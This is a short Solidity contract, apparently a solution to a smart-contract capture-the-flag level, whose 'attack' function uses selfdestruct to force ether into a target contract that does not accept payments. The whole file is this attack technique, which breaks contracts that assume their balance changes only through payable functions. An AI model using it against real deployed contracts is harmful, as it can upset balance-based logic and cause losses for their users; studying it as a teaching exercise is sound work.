// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceSol {

    function attack(address addr_) public payable {
       address payable addr = payable(address(addr_));
        selfdestruct(addr);
    }

}
